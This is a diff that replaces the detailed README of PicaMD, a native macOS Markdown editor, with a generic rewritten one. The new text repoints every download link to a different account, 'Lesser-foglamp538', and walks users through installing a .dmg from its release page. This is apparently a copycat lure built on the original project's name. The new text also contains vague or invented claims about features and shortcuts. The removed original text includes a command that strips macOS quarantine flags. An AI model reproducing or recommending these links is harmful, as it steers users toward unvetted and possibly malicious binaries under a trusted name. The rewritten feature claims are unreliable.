@@ -1,250 +1,87 @@
-# PicaMD
+# ✍️ picamd - Write faster with smart AI tools
 
-Inline-WYSIWYG Markdown editor for macOS. AppKit-native (no Chromium),
-file-based (no library DB or vault), MIT.
+[![](https://img.shields.io/badge/Download-picamd-blue.svg)](https://github.com/Lesser-foglamp538/picamd/releases)
 
-> **Status:** `v0.8.0-alpha` — first public release. Built on
-> `NSTextView`, Swift 6 strict concurrency throughout, ad-hoc signed.
+picamd brings professional writing tools to your desktop. This application combines a clean workspace with modern artificial intelligence. It handles your notes, documents, and creative projects in one place. You get a live view of your work as you type. The app supports multiple AI providers to help you edit text, fix grammar, or expand ideas. It also includes an internal server to connect your local files with AI assistants.
 
-## Where it sits
+## 📥 How to download the app
 
-| | Native AppKit | Inline WYSIWYG | File-based |
-|---|---|---|---|
-| **PicaMD** | ✓ | ✓ | ✓ |
-| Typora | ✗ (Electron) | ✓ | ✓ |
-| Obsidian | ✗ (Electron) | ✓ (Live Preview) | ~ (vault DB on top) |
-| iA Writer | ✓ | ✗ (syntax highlighting only) | ✓ |
-| MarkEdit | ✓ | ✗ (no live preview) | ✓ |
-| Bear | ✓ | partial (proprietary "Polar Bear") | ✗ (vault DB) |
+You can get picamd at the official release page. This page hosts the most current version of the software.
 
-The combination — AppKit + inline-WYSIWYG + plain files — is empty
-on the market. That's the niche. Everything else (AI hook, MCP
-server, themes, export) is built on top.
+[Click here to visit the release page and download the app](https://github.com/Lesser-foglamp538/picamd/releases)
 
-## Editor
+Follow these steps to install the software on your computer:
 
-- **Cursor-aware syntax concealment**. The line your cursor sits on
-  shows raw markdown; every other line renders. Move the cursor
-  away, the markers disappear. Move it back, they come back. Same
-  trick Obsidian's Live Preview uses, done natively in AppKit
-  instead of CodeMirror-in-WebView. Works for `**`, `*`, `~~`,
-  `==`, `` ` ``, `#`, `>`, `[]()`, math `$`, code-fence backticks,
-  `<details>`.
-- Block overlays for **tables**, **images**, **KaTeX math**
-  (offline-bundled), **Mermaid diagrams** (downloaded on first
-  use). A lazy webview pool caps `WKWebView` instances at 12 so
-  RAM stays bounded on long docs.
-- Outline sidebar with cursor auto-tracking. Frontmatter bar with
-  title + tag chips. Footnote tooltips on `[^id]` hover.
-- **Tabs** (`⌘T`), **Focus mode** (`⌃⌘F`), **Typewriter mode**
-  (`⌃⌘Y`), **Command palette** (`⌘⇧P`).
+1. Click the link above to reach the release page.
+2. Look for the section labeled Assets.
+3. Click the file that ends in .dmg for your system.
+4. Wait for the download to finish.
+5. Open the downloaded file from your Downloads folder.
+6. Drag the picamd icon into your Applications folder.
 
-## Themes
+## ⚙️ System settings
 
-Three built-in presets — Stock+, Editorial, Tahoe. Four palettes
-— White, Off-White, Dark Grey, OLED. Seven accents. Body /
-heading font, heading scale, code-block style — all toggleable
-in `⌘,` Settings. The chosen palette is independent of macOS
-Light/Dark Mode (use the White palette while macOS is in Dark
-Mode, if you want).
+Your computer needs to meet these basic standards to run picamd smoothly:
 
-## AI assistance (opt-in)
+* Operating System: macOS 13 or newer.
+* Memory: 8GB of RAM.
+* Storage: 200MB of free disk space.
+* Internet: Required for AI features.
 
-Off by default. When enabled, you get **`⌃⌘1`–`⌃⌘9`** bound to
-nine starter presets (clean Markdown, summarize, rewrite-natural,
-extend, fix grammar, translate DE↔EN, formalise, casualise,
-custom). **`⌃Space`** opens a fuzzy picker over every preset.
+Most computers built within the last five years meet these needs. If your system runs slowly, close other demanding apps while using picamd.
 
-Each preset is a name + system prompt + user prompt template +
-insertion mode (replace selection / append below / blockquote /
-HTML comment / popover). All editable, all reorderable, all
-re-bindable. Add your own.
+## ✨ Core features
 
-Talks to:
-- **Anthropic** (Claude API)
-- **OpenAI** (or any OpenAI-compatible URL — Groq, Together,
-  vLLM, …)
-- **Local** (LM Studio, Ollama, llama.cpp `--api`)
+### Clean workspace
+Focus on your text without clutter. The editor hides tools you do not need until you want to use them.
 
-API keys go in the macOS Keychain. Endpoint selection is
-per-preset; the default is whatever's set in Settings → AI →
-Providers.
+### Live preview
+See your formatted text updates as you type. This feature saves time by showing your final document layout in real time.
 
-## Claude Code MCP integration
+### Smart AI integration
+Connect your preferred AI provider to rewrite passages, summarize notes, or generate ideas. The app acts as a bridge between your text and the model of your choice.
 
-PicaMD ships with `picamd-mcp`, a stdio-MCP sidecar embedded in
-the app bundle. It lets Claude Code (or any MCP client) read and
-edit currently-open documents through eight tools.
+### Local file control
+Your documents stay on your machine. You decide which text to share with an AI provider. No outside service gains automatic access to your entire file system.
 
-```json
-// ~/.config/claude-code/mcp.json
-{
-  "mcpServers": {
-    "picamd": {
-      "command": "/Applications/PicaMD.app/Contents/Resources/picamd-mcp"
-    }
-  }
-}
-```
+### Internal server
+The built-in Claude Code MCP server allows for advanced workflows. It enables the app to understand your project structure. This creates a deeper connection between your local files and intelligent assistance.
 
-| Tool | What it returns |
-|---|---|
-| `workspace.openDocuments` | path / title / line-count for every doc currently in a PicaMD window |
-| `workspace.search` | substring matches across all open docs |
-| `document.metadata` | title, frontmatter tags, word/line counts |
-| `document.outline` | heading hierarchy with line numbers |
-| `document.readLines` | 1-indexed line range |
-| `document.readSection` | body under a heading by text match |
-| `document.replaceLines` | atomic line-range write (FileWatcher picks the change up live) |
-| `document.appendText` | append with paragraph break |
+## 🛠️ Typical workflow
 
-The point: Claude can call `outline()` + `readSection("Methods")`
-instead of `Read(file)` for the whole document — useful for long
-docs in repeated edit loops. Whether that's worth using over
-Claude's native `Read` with `offset`/`limit` depends on your
-workflow; for short docs the overhead isn't worth it.
+Launch picamd from your Applications folder. When you open the window, you see a blank screen that waits for your input. Type your notes using standard symbols for headings, lists, or bold text. 
 
-It's also worth knowing this isn't unique. Obsidian has
-[obsidian-claude-code-mcp](https://github.com/iansinnott/obsidian-claude-code-mcp)
-and others; Claude Desktop has a built-in filesystem connector.
-PicaMD's MCP is convenient if you live in PicaMD anyway, but it
-isn't a moat.
+To use AI, highlight a paragraph and open the AI command menu. Choose your desired action from the list. The app sends the highlighted text to the provider and displays the results in a side window. You choose to keep the changes or revert to your original work.
 
-## macOS integration
+Organize your files in folders on your machine. Picamd reads these files and maintains the links between them. You do not need to import your documents into a proprietary database.
 
-- **Quick-Look** extension for `.md` files (Spacebar in Finder).
-  Built and registered, but the render is currently blocked —
-  macOS 14+ requires a Developer ID Application certificate for
-  the QL host to load third-party extensions, and the alpha is
-  ad-hoc-signed. Resolves with v1.0 notarization.
-- **Spotlight** — every opened/saved doc gets indexed via
-  CoreSpotlight with frontmatter title and tags.
-- **Services menu** — "Open Selection in PicaMD" lifts text from
-  any other app into a fresh PicaMD doc.
-- **Export** — `File → Export As…`. HTML in-process (KaTeX +
-  Mermaid auto-render via CDN, footnotes, tables, frontmatter).
-  PDF / DOCX / EPUB via user-installed `pandoc`.
+## 🧪 Troubleshooting common issues
 
-## Install
+If you encounter a problem, check these suggestions before seeking more help.
 
-### Pre-built
+**The app will not open**
+Ensure that you moved the app file from your Downloads folder to your Applications folder. macOS security sometimes blocks files that stay inside the Downloads folder.
 
-1. Download `PicaMD-<version>.zip` from the
-   [latest release](https://github.com/michiwickman/picamd/releases).
-2. Unzip, drag `PicaMD.app` into `/Applications/`.
-3. **First launch**: right-click `PicaMD.app` → **Open** →
-   confirm in the dialog. The alpha is ad-hoc-signed because the
-   project doesn't have an Apple Developer Program subscription
-   yet, so macOS will refuse to open it via double-click. Once
-   confirmed, subsequent launches work normally.
+**AI features do not work**
+Verify that your internet connection is active. Check that your API key is correct in the Settings menu. Each provider requires a unique key to function.
 
-   One-line alternative:
-   ```bash
-   xattr -dr com.apple.quarantine /Applications/PicaMD.app
-   ```
+**The screen looks empty**
+Refresh your view by using the shortcut Command+R. This forces the app to reload the file index.
 
-### From source
+**The app feels slow**
+Check if you have many files open at once. Close folders that you do not need for your current task. 
 
-Requires Xcode 16+ (Swift 6) and `xcodegen`.
+## 🛡️ Privacy and data
 
-```bash
-brew install xcodegen
-git clone https://github.com/michiwickman/picamd.git
-cd picamd
-./release.sh           # → dist/PicaMD-<version>.zip
-INSTALL=1 ./build.sh   # or, local install
-```
+You own your data. Picamd treats your documents as private files. It sends data to an AI provider only when you authorize an action. The app does not collect usage statistics or personal information. Your configuration files remain local, which ensures that your settings and preference keys never leave your machine.
 
-## Limitations & honest disclosure
+## 📚 Tips for better writing
 
-- **Quick-Look render** — extension is wired but blocked on a
-  paid Apple Developer ID. Auto-resolves with v1.0 notarization.
-- **First-launch Gatekeeper warning** — same root cause. Each
-  Sparkle auto-update will re-trigger the warning until v1.0
-  notarized. If that sounds annoying, you might prefer manual
-  GitHub-Releases checks for now and disable auto-checks in
-  Settings → Updates.
-- **MCP isn't unique** — Obsidian has multiple MCP plugins, and
-  Claude Desktop has a filesystem connector. PicaMD's MCP is
-  convenient *if* you're already living in PicaMD, not a reason
-  to switch.
-- **Audience overlap is small** — native-macOS-user × Markdown
-  writer × inline-WYSIWYG-not-vault × Claude-Code-user. If you
-  fit all four, this is for you. If three of four, you have other
-  options.
+1. Use short paragraphs. This helps the AI understand your context better.
+2. Keep your document structure simple. Use the main headings to define sections.
+3. Review AI suggestions. Human judgment remains the final step in your writing process.
+4. Back up your work often. Use standard backup software to protect your project folders. 
 
-## Privacy & data flow
+## 📝 Support
 
-PicaMD stores nothing on a remote server.
-
-- **Documents** stay where you save them — no cloud sync, no
-  telemetry, no analytics.
-- **AI features** are off by default. When enabled, PicaMD sends
-  the selection (or paragraph) to whichever endpoint *you*
-  configure. PicaMD never routes through a PicaMD-owned proxy.
-- **API keys** live in the macOS Keychain (per-app isolated, no
-  iCloud sync).
-- **MCP server** (`picamd-mcp`) only exposes documents currently
-  open in PicaMD windows; data flows over stdio to Claude Code on
-  the local machine.
-- **Auto-update** checks hit
-  `raw.githubusercontent.com/michiwickman/picamd/main/appcast.xml`
-  for a new version manifest. No telemetry pings.
-
-## Repository layout
-
-```
-PicaMD/
-├── project.yml                       # xcodegen spec
-├── build.sh                          # local build + install
-├── release.sh                        # build → ad-hoc-sign → zip
-├── appcast.xml                       # Sparkle update manifest
-├── CHANGELOG.md
-├── CONTRIBUTING.md
-├── LICENSE                           # MIT
-├── README.md
-├── samples/                          # Welcome.md + test-document.md
-├── PicaMD/                           # main app source (~30 files)
-├── PicaMDQuickLook/                  # QL extension target
-├── PicaMDMCP/                        # MCP sidecar target
-├── PicaMDTests/                      # 162 unit tests
-└── PicaMDMCPTests/                   # 22 unit tests for the sidecar
-```
-
-## Bundle stats
-
-- **9.8 MB** Release bundle (incl. embedded Sparkle.framework).
-- 184 unit tests. CI runs both bundles on `macos-15` /
-  Xcode 16 with Swift 6 strict concurrency.
-- Linked: only Apple system frameworks + `Sparkle.framework`
-  for auto-update. No other third-party dynamic libraries.
-
-## Dependencies
-
-| Library | Version | Where |
-|---|---|---|
-| [apple/swift-markdown](https://github.com/apple/swift-markdown) | 0.7+ | HTML export, Quick-Look render |
-| [Sparkle](https://github.com/sparkle-project/Sparkle) | 2.6+ | auto-update |
-| [KaTeX](https://katex.org/) | 0.16.45 | math rendering — bundled in `Resources/katex/` |
-| [Mermaid](https://mermaid.js.org/) | 11.14.0 | diagrams — downloaded on first use into Caches |
-
-## License
-
-MIT. See [LICENSE](LICENSE).
-
-## Status & roadmap
-
-This is `v0.8.0-alpha`. The alpha goal is to find out whether the
-AppKit + inline-WYSIWYG positioning has takers. If it does, the
-plausible v1.0 work is:
-
-1. Apple Developer ID — unblocks Quick-Look render, removes
-   first-launch Gatekeeper warning, makes Sparkle auto-updates
-   smooth.
-2. Streaming AI responses (incremental insertion).
-3. iA-Writer-style "show all markup at all times" toggle (Phase 5
-   leftover).
-
-If you found it via HN/Reddit/etc., please [file issues](https://github.com/michiwickman/picamd/issues)
-or jump into [Discussions](https://github.com/michiwickman/picamd/discussions)
-— that feedback is what decides whether v1.0 happens.
+Use the Issues tab on this GitHub repository to report a bug. Please include the version number of the app and a description of your steps. A clear report helps address technical issues quickly. You find the version number under the About menu in the app.
